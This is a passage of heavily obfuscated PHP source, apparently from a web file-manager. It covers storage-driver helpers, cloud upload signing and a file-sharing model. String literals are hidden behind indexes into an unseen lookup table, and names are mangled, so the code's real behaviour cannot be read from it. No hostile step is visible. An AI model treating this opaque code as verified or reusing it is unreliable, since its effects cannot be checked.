$é­›Ï³Œ = array($· ¯Ö¸ö[1377], $· ¯Ö¸ö[1378], $· ¯Ö¸ö[1379], $· ¯Ö¸ö[1380], $· ¯Ö¸ö[1381], $· ¯Ö¸ö[1382], $· ¯Ö¸ö[1383], $· ¯Ö¸ö[1384]); foreach ($èŠšËµ¥ as $Û£‚â±) { $‰·ûñöş = preg_split($· ¯Ö¸ö[1385], $Û£‚â±); $£åèø« = $‰·ûñöş[count($‰·ûñöş) - 1]; if (!strstr($‰·ûñöş[0], $· ¯Ö¸ö[1386]) || !$£åèø«) { continue; } $¸ïğüø = rtrim($£åèø«, $· ¯Ö¸ö[8]) . $· ¯Ö¸ö[8]; if (in_array($¸ïğüø, $é­›Ï³Œ)) { continue; } $äŞßá’[] = $¸ïğüø; } return $äŞßá’; } public static function isSameDisk($ô°ÇÍĞ, $úã¶¥¶Õ) { $ş¤é²òô =& $_SERVER[óÔë„ú]; if ($GLOBALS[$ş¤é²òô[6]][$ş¤é²òô[1372]] == $ş¤é²òô[1373]) { return strtolower(substr($ô°ÇÍĞ, 0, 1)) == strtolower(substr($úã¶¥¶Õ, 0, 1)); } $ùĞ¯äªá = self::diskList(); $Å‘ŠÇ´  = !1; $ÍÉ«ƒÙ‰ = !1; sort($ùĞ¯äªá); $ùĞ¯äªá = array_reverse($ùĞ¯äªá); $ô°ÇÍĞ = rtrim($ô°ÇÍĞ, $ş¤é²òô[8]) . $ş¤é²òô[8]; $úã¶¥¶Õ = rtrim($úã¶¥¶Õ, $ş¤é²òô[8]) . $ş¤é²òô[8]; foreach ($ùĞ¯äªá as $Õî¾âé€) { $ÙûÓ¥È = strlen($Õî¾âé€); if (!$Å‘ŠÇ´  && substr($ô°ÇÍĞ, 0, $ÙûÓ¥È) == $Õî¾âé€) { $Å‘ŠÇ´  = $Õî¾âé€; } if (!$ÍÉ«ƒÙ‰ && substr($úã¶¥¶Õ, 0, $ÙûÓ¥È) == $Õî¾âé€) { $ÍÉ«ƒÙ‰ = $Õî¾âé€; } if ($Å‘ŠÇ´  && $ÍÉ«ƒÙ‰) { break; } } return $Å‘ŠÇ´  === $ÍÉ«ƒÙ‰; } public static function transferType($ı¾³ÔØø, $ªéïú‡­) { $’°Î‘¶ =& $_SERVER[óÔë„ú]; $„¯“˜§£ = self::driverType($ı¾³ÔØø); $ş¨çªç’ = self::driverType($ªéïú‡­); if ($„¯“˜§£[$’°Î‘¶[33]] == $ş¨çªç’[$’°Î‘¶[33]] && $„¯“˜§£[$’°Î‘¶[1387]] == $ş¨çªç’[$’°Î‘¶[1387]]) { return $’°Î‘¶[1388]; } if ($„¯“˜§£[$’°Î‘¶[33]] == $’°Î‘¶[928] && $ş¨çªç’[$’°Î‘¶[33]] == $’°Î‘¶[109]) { return $’°Î‘¶[1266]; } if ($„¯“˜§£[$’°Î‘¶[33]] == $’°Î‘¶[109] && $ş¨çªç’[$’°Î‘¶[33]] == $’°Î‘¶[928]) { return $’°Î‘¶[110]; } return $’°Î‘¶[1389]; } public static function driverType($©¹ˆªĞ“) { $ÒÒÀŠª« =& $_SERVER[óÔë„ú]; $–°ö© = str_replace($ÒÒÀŠª«[1390], $ÒÒÀŠª«[12], strtolower($©¹ˆªĞ“->getType())); if ($–°ö© == $ÒÒÀŠª«[817] || $–°ö© == $ÒÒÀŠª«[1391] || $–°ö© == $ÒÒÀŠª«[1392]) { $©¹ˆªĞ“ = self::defaultDriverInit(); } else { if ($–°ö© == $ÒÒÀŠª«[1276] || $–°ö© == $ÒÒÀŠª«[1393]) { $©¹ˆªĞ“ = IO::init($©¹ˆªĞ“->pathParse[$ÒÒÀŠª«[1217]]); } } $–Œ½¬ªÔ = $©¹ˆªĞ“->path; $–°ö© = str_replace($ÒÒÀŠª«[1390], $ÒÒÀŠª«[12], strtolower($©¹ˆªĞ“->getType())); if ($–°ö© == $ÒÒÀŠª«[109]) { return array($ÒÒÀŠª«[33] => $ÒÒÀŠª«[109], $ÒÒÀŠª«[1387] => $ÒÒÀŠª«[12], $ÒÒÀŠª«[87] => $–Œ½¬ªÔ, $ÒÒÀŠª«[98] => $©¹ˆªĞ“); } return array($ÒÒÀŠª«[33] => $ÒÒÀŠª«[928], $ÒÒÀŠª«[1387] => $©¹ˆªĞ“->pathDriver, $ÒÒÀŠª«[87] => $–Œ½¬ªÔ, $ÒÒÀŠª«[98] => $©¹ˆªĞ“); } public static function pathDriverType($Ô’üãô) { return $Ô’üãô ? self::driverType(IO::init($Ô’üãô)) : !1; } public static function pathDriverLocal($œƒƒÌ) { $Éçåïıœ =& $_SERVER[óÔë„ú]; $“ı²ÕŞ® = $œƒƒÌ ? self::driverType(IO::init($œƒƒÌ)) : !1; return strtolower($“ı²ÕŞ®[$Éçåïıœ[33]]) == $Éçåïıœ[109] ? !0 : !1; } public static function allowCover($ä²±¥¾, $ĞÂú±Ãƒ = true) { $éÁæÎ‰» =& $_SERVER[óÔë„ú]; if (is_string($ä²±¥¾)) { $ä²±¥¾ = IO::info($ä²±¥¾); } if (!$ä²±¥¾ || $ä²±¥¾[$éÁæÎ‰»[33]] == $éÁæÎ‰»[78] || $ä²±¥¾[$éÁæÎ‰»[79]] <= 100) { return !1; } if (isset($ä²±¥¾[$éÁæÎ‰»[1394]]) || !$ä²±¥¾[$éÁæÎ‰»[87]]) { return !1; } if (isset($ä²±¥¾[$éÁæÎ‰»[232]]) && !$ä²±¥¾[$éÁæÎ‰»[232]]) { return !1; } static $ø¹Åâ¬ß = false; if (!$ø¹Åâ¬ß || !$ĞÂú±Ãƒ) { $ŸÛÌİ‡» = self::driverType(IO::init($ä²±¥¾[$éÁæÎ‰»[87]])); $À£”Í‚ó = $ŸÛÌİ‡»[$éÁæÎ‰»[98]]; $ø¹Åâ¬ß = $éÁæÎ‰»[196]; if ($ŸÛÌİ‡»[$éÁæÎ‰»[33]] == $éÁæÎ‰»[109]) { $ø¹Åâ¬ß = $éÁæÎ‰»[1395]; } if ($ŸÛÌİ‡»[$éÁæÎ‰»[98]] && is_array($ŸÛÌİ‡»[$éÁæÎ‰»[98]]->config)) { $±ÃÂªÖó = $ŸÛÌİ‡»[$éÁæÎ‰»[98]]->config; if (isset($±ÃÂªÖó[$éÁæÎ‰»[1396]]) && $±ÃÂªÖó[$éÁæÎ‰»[1396]]) { $ø¹Åâ¬ß = $éÁæÎ‰»[1395]; } } $’´ÆØƒ‚ = KodIO::defaultDriver(); if (strtolower($’´ÆØƒ‚[$éÁæÎ‰»[98]]) == $éÁæÎ‰»[109] && is_array($’´ÆØƒ‚[$éÁæÎ‰»[6]])) { $¶‰“ãß‘ = $’´ÆØƒ‚[$éÁæÎ‰»[6]][$éÁæÎ‰»[1247]]; if (substr($¶‰“ãß‘, 0, 2) == $éÁæÎ‰»[1397]) { $¶‰“ãß‘ = str_replace($éÁæÎ‰»[1397], BASIC_PATH, $¶‰“ãß‘); } $¶‰“ãß‘ = str_replace($éÁæÎ‰»[592], $éÁæÎ‰»[8], $¶‰“ãß‘); if (substr($ä²±¥¾[$éÁæÎ‰»[87]], 0, strlen($¶‰“ãß‘)) == $¶‰“ãß‘) { $ø¹Åâ¬ß = $éÁæÎ‰»[196]; } } } return $ø¹Åâ¬ß == $éÁæÎ‰»[1395] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ïÌ÷ìÏí) { parent::__construct($ïÌ÷ìÏí); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($î“âÏÎ) { $åÓğŠÊˆ =& $_SERVER[óÔë„ú]; if (substr($î“âÏÎ, 0, 7) == $åÓğŠÊˆ[313]) { $î“âÏÎ = $åÓğŠÊˆ[314] . substr($î“âÏÎ, 7); } header($åÓğŠÊˆ[175] . $î“âÏÎ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ó¯ĞĞâ) { parent::__construct($Ó¯ĞĞâ); $this->setSignVersion($_SERVER[óÔë„ú][247]); } public function uploadFormData($­‘ÉçŠ, $»›ÀƒÒ© = 3600) { $ã¿ÅÜŒ =& $_SERVER[óÔë„ú]; $´ô½Ç˜Ğ = $ã¿ÅÜŒ[229]; $‚ªõ“¹µ = $ã¿ÅÜŒ[263]; $®«î«Çş = $ã¿ÅÜŒ[274]; $ó×…Øü³ = gmdate($ã¿ÅÜŒ[299], time() + $»›ÀƒÒ©); $ÀœËû¡å = (string) time() . $ã¿ÅÜŒ[74] . (string) (time() + $»›ÀƒÒ©); $¼º¦Óø¹ = array($ã¿ÅÜŒ[275] => $ó×…Øü³, $ã¿ÅÜŒ[278] => array(array($ã¿ÅÜŒ[280] => $´ô½Ç˜Ğ), array($ã¿ÅÜŒ[279] => $this->bucket), array($ã¿ÅÜŒ[281], $ã¿ÅÜŒ[282], $ã¿ÅÜŒ[12]), array($ã¿ÅÜŒ[285] => $®«î«Çş), array($ã¿ÅÜŒ[1398] => $‚ªõ“¹µ), array($ã¿ÅÜŒ[1399] => $this->accessKey), array($ã¿ÅÜŒ[1400] => $ÀœËû¡å))); $¼º¦Óø¹ = json_encode($¼º¦Óø¹); $ˆ¢ş‰ãá = hash_hmac($ã¿ÅÜŒ[263], $ÀœËû¡å, $this->secret); $ºêöÃ×Ù = sha1($¼º¦Óø¹); $˜™üü£Ò = hash_hmac($ã¿ÅÜŒ[263], $ºêöÃ×Ù, $ˆ¢ş‰ãá); $õî€ìæÈ = array($ã¿ÅÜŒ[280] => $´ô½Ç˜Ğ, $ã¿ÅÜŒ[285] => $®«î«Çş, $ã¿ÅÜŒ[293] => base64_encode($¼º¦Óø¹), $ã¿ÅÜŒ[1398] => $‚ªõ“¹µ, $ã¿ÅÜŒ[1399] => $this->accessKey, $ã¿ÅÜŒ[1401] => $ÀœËû¡å, $ã¿ÅÜŒ[1402] => $˜™üü£Ò, $ã¿ÅÜŒ[208] => $this->getHost()); return $õî€ìæÈ; } public function fileOutImage($Ú˜µËŞÊ, $ôÆˆÛà± = 250) { $‡İÓ®‰ =& $_SERVER[óÔë„ú]; if ($this->size($Ú˜µËŞÊ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ú˜µËŞÊ, $ôÆˆÛà±); } $¥ä×•ï» = $this->link($Ú˜µËŞÊ); $¥ä×•ï» .= $‡İÓ®‰[1403] . $ôÆˆÛà± . $‡İÓ®‰[1404]; $this->fileOutLink($¥ä×•ï»); } public function fileOutLink($¡âÁÙÏØ) { $ò¯ÊƒÈ =& $_SERVER[óÔë„ú]; if (substr($¡âÁÙÏØ, 0, 7) == $ò¯ÊƒÈ[313]) { $¡âÁÙÏØ = $ò¯ÊƒÈ[314] . substr($¡âÁÙÏØ, 7); } header($ò¯ÊƒÈ[175] . $¡âÁÙÏØ); die; } } goto EåÅÊ¨ÊŠÇ; aƒšŠŠ‹¡: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\163\145\162\x74\54\x75\160\x64\141\x74\145", "\146\x75\x6e\x63\164\x69\157\156"), array("\143\x72\145\141\164\145\124\x69\155\145", "\x74\151\155\x65", "\x69\156\x73\145\162\164", "\146\165\156\143\x74\x69\157\156"), array("\157\160\164\x69\x6f\x6e\x73", '', "\151\x6e\x73\x65\162\x74\54\165\x70\144\141\164\145\54\x73\x65\154\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÈåÖ“íÍ) { $ÎÍùœé” =& $_SERVER[óÔë„ú]; $ÌÍ¶ï‘‡ = isset($ÈåÖ“íÍ[0]) ? $ÈåÖ“íÍ[0] : !1; return array($ÎÍùœé”[2100] => array(USER_ID, $ÎÍùœé”[2101]), $ÎÍùœé”[2041] => array($ÌÍ¶ï‘‡, $ÎÍùœé”[2102])); } protected function listSimple() { $Ïåïç·® = array($_SERVER[óÔë„ú][1758] => USER_ID); $ùËÕ¿¾Ü = $this->field($this->fieldList)->where($Ïåïç·®)->select(); return $ùËÕ¿¾Ü ? $ùËÕ¿¾Ü : array(); } protected function getInfo($É¼€üøñ, $†¬ƒ‰¤Ì = false) { $²¯„¸×Ï =& $_SERVER[óÔë„ú]; if ($†¬ƒ‰¤Ì) { return $this->_getShareInfo(array($²¯„¸×Ï[665] => $É¼€üøñ)); } $„€İæœ­ = $this->cacheFunctionGet($²¯„¸×Ï[2043], $É¼€üøñ); return $„€İæœ­; } public function getInfoByHash($æ¬½Ãğ¹) { return $this->_getShareInfo(array($_SERVER[óÔë„ú][2103] => $æ¬½Ãğ¹)); } public function getInfoByPath($‰ “Â˜ë) { $½ĞÄùÂ‘ =& $_SERVER[óÔë„ú]; $Œöºí = array($½ĞÄùÂ‘[1758] => USER_ID, $½ĞÄùÂ‘[193] => $‰ “Â˜ë); return $this->_getShareInfo($Œöºí); } public function getInfoBySourcePath($˜«È§‡ê) { $Äñí›İ´ =& $_SERVER[óÔë„ú]; $Ë–Ï¯õ = array($Äñí›İ´[1758] => USER_ID, $Äñí›İ´[1242] => $˜«È§‡ê); return $this->_getShareInfo($Ë–Ï¯õ); } private function _getShareInfo($Çˆä›) { $Ö¯õÄäì =& $_SERVER[óÔë„ú]; $ùÖ¿™ª = $this->where($Çˆä›)->find(); if (!$ùÖ¿™ª) { return !1; } $Çˆä› = array($Ö¯õÄäì[665] => $ùÖ¿™ª[$Ö¯õÄäì[665]]); $¢ÄŸ•µ˜ = $Ö¯õÄäì[2104]; $¿í‹ÎÉ¨ = Model($Ö¯õÄäì[666])->order($Ö¯õÄäì[475])->field($¢ÄŸ•µ˜)->where($Çˆä›)->select(); if ($ùÖ¿™ª[$Ö¯õÄäì[193]] == $Ö¯õÄäì[228]) { $ùÖ¿™ª[$Ö¯õÄäì[90]] = IO::info($ùÖ¿™ª[$Ö¯õÄäì[1242]]); } else { $ùÖ¿™ª[$Ö¯õÄäì[90]] = Model($Ö¯õÄäì[1405])->pathInfo($ùÖ¿™ª[$Ö¯õÄäì[193]]); } $ùÖ¿™ª[$Ö¯õÄäì[2105]] = $¿í‹ÎÉ¨; return $ùÖ¿™ª; } protected function getInfoAuth($©öö“ıµ) { $¸©•Í‚Ò =& $_SERVER[óÔë„ú]; $ÔôìªÃí = $this->getInfo($©öö“ıµ); if ($ÔôìªÃí[$¸©•Í‚Ò[1758]] == USER_ID) { $ÔôìªÃí[$¸©•Í‚Ò[487]] = $ÔôìªÃí[$¸©•Í‚Ò[90]][$¸©•Í‚Ò[487]]; } else { $ÔôìªÃí[$¸©•Í‚Ò[487]] = Model($¸©•Í‚Ò[567])->authMake($ÔôìªÃí[$¸©•Í‚Ò[2105]]); } return $ÔôìªÃí; } protected function listData($—“ÍŞÂŠ = null, $¿µõîµ­ = 300) { $õïå«™À =& $_SERVER[óÔë„ú]; $‹¦‚Ä·å = array(array($õïå«™À[562] => array($õïå«™À[1075], 0), $õïå«™À[663] => array($õïå«™À[1075], 0), $õïå«™À[2106] => $õïå«™À[2059])); if ($—“ÍŞÂŠ == $õïå«™À[2107]) { $‹¦‚Ä·å = array($õïå«™À[562] => 1); } else { if ($—“ÍŞÂŠ == $õïå«™À[1227]) { $‹¦‚Ä·å = array($õïå«™À[663] => 1); } } $‹¦‚Ä·å[$õïå«™À[1758]] = USER_ID; $˜ÄÍõüî = $this->where($‹¦‚Ä·å)->selectPage($¿µõîµ­); return $˜ÄÍõüî; } protected function listToMe($—¡ğãÅ = 300) { $ÔÓ˜êËÇ =& $_SERVER[óÔë„ú]; $³Ä½‚‡ö = Model($ÔÓ˜êËÇ[2108])->userGroupParents(USER_ID); $‡ÏŒèàÅ = array($ÔÓ˜êËÇ[648] => SourceModel::TYPE_USER, $ÔÓ˜êËÇ[569] => USER_ID); if ($³Ä½‚‡ö) { $‡ÏŒèàÅ = array(array($ÔÓ˜êËÇ[648] => SourceModel::TYPE_USER, $ÔÓ˜êËÇ[569] => USER_ID), array($ÔÓ˜êËÇ[648] => SourceModel::TYPE_GROUP, $ÔÓ˜êËÇ[569] => array($ÔÓ˜êËÇ[7], $³Ä½‚‡ö)), $ÔÓ˜êËÇ[2106] => $ÔÓ˜êËÇ[2059]); } $µôÈü¬ã = Model($ÔÓ˜êËÇ[666])->where($‡ÏŒèàÅ)->selectPage($—¡ğãÅ); $—‚“¿í = array_to_keyvalue_group($µôÈü¬ã[$ÔÓ˜êËÇ[445]], $ÔÓ˜êËÇ[665]); if (!$—‚“¿í) { return $µôÈü¬ã; } $ˆ«ãÓµ¹ = $ÔÓ˜êËÇ[2109]; $‡ÏŒèàÅ = array($ÔÓ˜êËÇ[665] => array($ÔÓ˜êËÇ[492], array_keys($—‚“¿í)), $ÔÓ˜êËÇ[1758] => array($ÔÓ˜êËÇ[1077], $ÔÓ˜êËÇ[228])); $®ªÊ¬›İ = $this->field($ˆ«ãÓµ¹)->where($‡ÏŒèàÅ)->select(); foreach ($®ªÊ¬›İ as $°ş¡ÊÕ => &$üÖ©‚éğ) { $üÖ©‚éğ[$ÔÓ˜êËÇ[2105]] = $—‚“¿í[$üÖ©‚éğ[$ÔÓ˜êËÇ[665]]]; } unset($üÖ©‚éğ); $ßÄ™–Á” = array($ÔÓ˜êËÇ[2110] => $®ªÊ¬›İ, $ÔÓ˜êËÇ[2111] => $µôÈü¬ã[$ÔÓ˜êËÇ[442]]); return $ßÄ™–Á”; } protected function shareAdd($ï¦Š÷ï¶, $ºš¨ê’å) { $äÖİ çü =& $_SERVER[óÔë„ú]; $ÇÔıôµ‘ = $this->_addShareData($ï¦Š÷ï¶, $ºš¨ê’å); if (!empty($ºš¨ê’å[$äÖİ çü[2112]])) { $this->_shareAuthSet($ÇÔıôµ‘, $ºš¨ê’å[$äÖİ çü[2112]]); } $this->shareEventAdd($ï¦Š÷ï¶, $ºš¨ê’å, $äÖİ çü[2113]); return $ÇÔıôµ‘; } protected function shareAddSystem($†À¿à™é, $¹Âã•ÏÕ) { $Çô£äíË =& $_SERVER[óÔë„ú]; $Ä®áØŒ² = $this->_addShareData($†À¿à™é, $¹Âã•ÏÕ, $Çô£äíË[191]); $this->_shareAuthSet($Ä®áØŒ², $¹Âã•ÏÕ[$Çô£äíË[2112]]); return $Ä®áØŒ²; } private function shareEventAdd($ı«…Ğù, $íÆ–ÁŒ„, $à×½şÇš = "\141\x64\144") { $¬îšº¨Ø =& $_SERVER[óÔë„ú]; if (!$ı«…Ğù || $ı«…Ğù == $¬îšº¨Ø[228]) { return; } if ($à×½şÇš == $¬îšº¨Ø[2113]) { if ($íÆ–ÁŒ„[$¬îšº¨Ø[562]] == $¬îšº¨Ø[91]) { Model($¬îšº¨Ø[633])->eventShare($ı«…Ğù, $¬îšº¨Ø[2114]); } if ($íÆ–ÁŒ„[$¬îšº¨Ø[663]] == $¬îšº¨Ø[91]) { Model($¬îšº¨Ø[633])->eventShare($ı«…Ğù, $¬îšº¨Ø[2115]); } return; } $§û¤éË‰ = $this->getInfoByPath($ı«…Ğù); $Üôä†§ó = $¬îšº¨Ø[2116]; if ($§û¤éË‰[$¬îšº¨Ø[562]] == $¬îšº¨Ø[228] && $íÆ–ÁŒ„[$¬îšº¨Ø[562]] == $¬îšº¨Ø[91]) { $Üôä†§ó = $¬îšº¨Ø[2114]; } if ($§û¤éË‰[$¬îšº¨Ø[562]] == $¬îšº¨Ø[91] && $íÆ–ÁŒ„[$¬îšº¨Ø[562]] == $¬îšº¨Ø[228]) { $Üôä†§ó = $¬îšº¨Ø[2117]; } if ($§û¤éË‰[$¬îšº¨Ø[663]] == $¬îšº¨Ø[228] && $íÆ–ÁŒ„[$¬îšº¨Ø[663]] == $¬îšº¨Ø[91]) { $Üôä†§ó = $¬îšº¨Ø[2115]; } if ($§û¤éË‰[$¬îšº¨Ø[663]] == $¬îšº¨Ø[91] && $íÆ–ÁŒ„[$¬îšº¨Ø[663]] == $¬îšº¨Ø[228]) { $Üôä†§ó = $¬îšº¨Ø[2118]; } Model($¬îšº¨Ø[633])->eventShare($ı«…Ğù, $Üôä†§ó); return; } private function _addShareData($Ü’×·ê¸, $öİÛêÆø = array(), $ ­äµ × = false) { $Á¢üò¤ =& $_SERVER[óÔë„ú]; $‡½ñşÁä = $ ­äµ × == $Á¢üò¤[191] ? 0 : USER_ID; $ŞÄÖ˜Ñ = array($Á¢üò¤[491] => $Ü’×·ê¸, $Á¢üò¤[1749] => $‡½ñşÁä); if ($Ü’×·ê¸ == 0) { $ŞÄÖ˜Ñ = array($Á¢üò¤[2119] => $öİÛêÆø[$Á¢üò¤[1242]], $Á¢üò¤[1749] => $‡½ñşÁä); } if ($ÄñƒÌ¶ì = $this->where($ŞÄÖ˜Ñ)->find()) { return $ÄñƒÌ¶ì[$Á¢üò¤[665]]; } if ($Ü’×·ê¸ == 0) { $ÇìàÅÉ = array($Á¢üò¤[32] => get_path_this($öİÛêÆø[$Á¢üò¤[87]])); } else { $ÇìàÅÉ = Model($Á¢üò¤[884])->sourceInfo($Ü’×·ê¸); if (!$ÇìàÅÉ) { return !1; } } if (!$öİÛêÆø[$Á¢üò¤[1647]]) { $öİÛêÆø[$Á¢üò¤[1647]] = $ÇìàÅÉ[$Á¢üò¤[32]]; } $çŸí¬á = array($Á¢üò¤[1749] => $‡½ñşÁä, $Á¢üò¤[491] => $Ü’×·ê¸, $Á¢üò¤[1647] => $Á¢üò¤[12], $Á¢üò¤[562] => 0, $Á¢üò¤[663] => 0, $Á¢üò¤[1242] => $Á¢üò¤[12], $Á¢üò¤[383] => $Á¢üò¤[12], $Á¢üò¤[952] => $Á¢üò¤[12], $Á¢üò¤[2120] => 0, $Á¢üò¤[2121] => 0, $Á¢üò¤[821] => 0, $Á¢üò¤[2122] => $Á¢üò¤[12], $Á¢üò¤[2103] => $Á¢üò¤[12]); $¨¥ôô©å = explode($Á¢üò¤[50], $Á¢üò¤[2123]); foreach ($¨¥ôô©å as $ÊÒÑèÀĞ) { if (!isset($öİÛêÆø[$ÊÒÑèÀĞ])) { continue; } $çŸí¬á[$ÊÒÑèÀĞ] = $öİÛêÆø[$ÊÒÑèÀĞ]; } $éºëàòù = $this->add($çŸí¬á); $á¢‰ü†ğ = array($Á¢üò¤[2103] => short_id($éºëàòù)); $this->where(array($Á¢üò¤[2124] => $éºëàòù))->save($á¢‰ü†ğ); return $éºëàòù; } private function _shareAuthSet($í©„È‘¨, $şòäª¦€) { $Î—ÒàÆ =& $_SERVER[óÔë„ú]; if (!is_array($şòäª¦€)) { return !1; } $ÙÛúû• = Model($Î—ÒàÆ[2069]); $ÙÛúû•->where(array($Î—ÒàÆ[665] => $í©„È‘¨))->delete(); $‘ºå˜ò• = array(); foreach ($şòäª¦€ as $½ˆè×Çƒ) { $ÑÃäéşº = SourceModel::TYPE_USER; if ($½ˆè×Çƒ[$Î—ÒàÆ[190]] == SourceModel::TYPE_GROUP) { $ÑÃäéşº = SourceModel::TYPE_GROUP; } $¿ëÊ½Â¾ = array($Î—ÒàÆ[665] => $í©„È‘¨, $Î—ÒàÆ[190] => $ÑÃäéşº, $Î—ÒàÆ[569] => intval($½ˆè×Çƒ[$Î—ÒàÆ[569]]), $Î—ÒàÆ[2065] => 0, $Î—ÒàÆ[2125] => -1); if ($½ˆè×Çƒ[$Î—ÒàÆ[2065]]) { $¿ëÊ½Â¾[$Î—ÒàÆ[2065]] = $½ˆè×Çƒ[$Î—ÒàÆ[2065]]; } else { if ($½ˆè×Çƒ[$Î—ÒàÆ[2125]]) { $¿ëÊ½Â¾[$Î—ÒàÆ[2125]] = $½ˆè×Çƒ[$Î—ÒàÆ[2125]]; } } $‘ºå˜ò•[] = $¿ëÊ½Â¾; } return $ÙÛúû•->addAll($‘ºå˜ò•, array(), !0); } public function numViewAdd($öµÀğÖÌ) { $ƒ‰Ëô…Ò =& $_SERVER[óÔë„ú]; $×ñêÔª = array($ƒ‰Ëô…Ò[2124] => $öµÀğÖÌ); $this->where($×ñêÔª)->setAdd($ƒ‰Ëô…Ò[2120]); } public function numDownloadAdd($Ø‘”ˆá¿) { $ÑÚŞ«ì‹ =& $_SERVER[óÔë„ú]; $ÑãÔòÅó = array($ÑÚŞ«ì‹[2124] => $Ø‘”ˆá¿); $this->where($ÑãÔòÅó)->setAdd($ÑÚŞ«ì‹[2121]); } protected function shareEdit($ô‡¿Æ«ä, $çÇŞª‚‘) { $à•Á”‚ =& $_SERVER[óÔë„ú]; $Ü¬Œû­ˆ = $this->getInfo($ô‡¿Æ«ä); if (!$Ü¬Œû­ˆ) { return !1; } $this->_checkLinkShare($çÇŞª‚‘, $Ü¬Œû­ˆ); $ğïùğ§ = array(); $âÀïíÚÜ = explode($à•Á”‚[50], $à•Á”‚[2126]); foreach ($âÀïíÚÜ as $ŠâĞß¸) { if (!array_key_exists($ŠâĞß¸, $çÇŞª‚‘)) { continue; } $ğïùğ§[$ŠâĞß¸] = $çÇŞª‚‘[$ŠâĞß¸]; } $this->shareEventAdd($Ü¬Œû­ˆ[$à•Á”‚[193]], $çÇŞª‚‘, $à•Á”‚[1926]); $this->where(array($à•Á”‚[2124] => $ô‡¿Æ«ä))->save($ğïùğ§); if (isset($çÇŞª‚‘[$à•Á”‚[2112]])) { $this->_shareAuthSet($ô‡¿Æ«ä, $çÇŞª‚‘[$à•Á”‚[2112]]); } return !0; } private function _checkLinkShare($×‘ °†½, $­¤Ô¬§) { $ÄåŒ†Œ– =& $_SERVER[óÔë„ú]; if ($×‘ °†½[$ÄåŒ†Œ–[562]] != $ÄåŒ†Œ–[91]) { return; } $úµ˜Çä = $­¤Ô¬§[$ÄåŒ†Œ–[90]][$ÄåŒ†Œ–[193]]; if ($­¤Ô¬§[$ÄåŒ†Œ–[90]][$ÄåŒ†Œ–[33]] != $ÄåŒ†Œ–[230]) { $ÍÎÅíˆã = $this->_folderReport($úµ˜Çä); if (!$ÍÎÅíˆã) { return; } show_json(LNG($ÄåŒ†Œ–[2127]) . $ÄåŒ†Œ–[2128] . $ÍÎÅíˆã, !1); } $ß™ÜªÑ = Model($ÄåŒ†Œ–[884])->fileInfoGet($­¤Ô¬§[$ÄåŒ†Œ–[90]][$ÄåŒ†Œ–[193]]); if (!$ß™ÜªÑ) { return; } $™ÈÇ¹Š’ = $this->shareFileMeta($ß™ÜªÑ[$ÄåŒ†Œ–[541]]); if (isset($™ÈÇ¹Š’[$ÄåŒ†Œ–[450]]) && $™ÈÇ¹Š’[$ÄåŒ†Œ–[450]] == $ÄåŒ†Œ–[91]) { show_json(LNG($ÄåŒ†Œ–[2129]), !1); } } private function _folderReport($‚‡¢Ñõà) { $»É×•Å =& $_SERVER[óÔë„ú]; $ÀâãåÂƒ = array($»É×•Å[541] => array($»É×•Å[1075], 0), $»É×•Å[810] => 3); $ãÅ «ë… = Model($»É×•Å[2130])->where($ÀâãåÂƒ)->field($»É×•Å[541])->select(); if (!$ãÅ «ë…) { return !1; } $ãÅ «ë… = array_to_keyvalue($ãÅ «ë…, $»É×•Å[12], $»É×•Å[541]); $ÉôïÎÄ³ = $»É×•Å[50] . $‚‡¢Ñõà . $»É×•Å[50]; $ÀâãåÂƒ = array($»É×•Å[541] => array($»É×•Å[7], $ãÅ «ë…), $»É×•Å[584] => array($»É×•Å[459], "\45{$ÉôïÎÄ³}\45"), $»É×•Å[505] => 0); $íåÉø¬ = Model($»É×•Å[884])->where($ÀâãåÂƒ)->field($»É×•Å[2131])->find(); if (!$íåÉø¬) { return !1; } $Ï±ÅÜÅà = substr($íåÉø¬[$»É×•Å[584]], strpos($íåÉø¬[$»É×•Å[584]], $ÉôïÎÄ³)); $ÀâãåÂƒ = array($»É×•Å[193] => array($»É×•Å[7], trim($Ï±ÅÜÅà, $»É×•Å[50]))); $…Ññ‘ÖÔ = Model($»É×•Å[884])->where($ÀâãåÂƒ)->field($»É×•Å[32])->select(); $¬Òôİœ¿ = array_to_keyvalue($…Ññ‘ÖÔ, $»É×•Å[12], $»É×•Å[32]); $¬Òôİœ¿[] = $íåÉø¬[$»É×•Å[32]]; return implode($»É×•Å[8], $¬Òôİœ¿); } protected function remove($“ÆÒ¬õ) { $Í—ËŸÙ =& $_SERVER[óÔë„ú]; $ôÀ¤½„Ì = is_array($“ÆÒ¬õ) ? $“ÆÒ¬õ : array($“ÆÒ¬õ); for ($ú‹Å¿æã = 0; $ú‹Å¿æã < count($ôÀ¤½„Ì); $ú‹Å¿æã++) { $ì’ò¯î– = $this->getInfo($ôÀ¤½„Ì[$ú‹Å¿æã]); if ($ì’ò¯î–[$Í—ËŸÙ[663]] == $Í—ËŸÙ[91]) { Model($Í—ËŸÙ[633])->eventShare($ì’ò¯î–[$Í—ËŸÙ[193]], $Í—ËŸÙ[2118]); } if ($ì’ò¯î–[$Í—ËŸÙ[562]] == $Í—ËŸÙ[91]) { Model($Í—ËŸÙ[633])->eventShare($ì’ò¯î–[$Í—ËŸÙ[193]], $Í—ËŸÙ[2117]); } } if (is_array($“ÆÒ¬õ)) { $“ÆÒ¬õ = array($Í—ËŸÙ[7], $“ÆÒ¬õ); } $ã’—¸•Ñ = array($Í—ËŸÙ[665] => $“ÆÒ¬õ); $¯–Ôµˆƒ = $this->where($ã’—¸•Ñ)->delete(); if ($¯–Ôµˆƒ) { Model($Í—ËŸÙ[666])->where(array($Í—ËŸÙ[665] => $“ÆÒ¬õ))->delete(); } return $¯–Ôµˆƒ; } protected function removeBySource($Ä×Ø¨¾ˆ) { $ÍÖÁØ´  =& $_SERVER[óÔë„ú]; $ÔäÔªÍÕ = array($ÍÖÁØ´ [491] => array($ÍÖÁØ´ [492], $Ä×Ø¨¾ˆ)); $š®‡–¶¾ = $this->field($ÍÖÁØ´ [665])->where($ÔäÔªÍÕ)->select(); $š®‡–¶¾ = 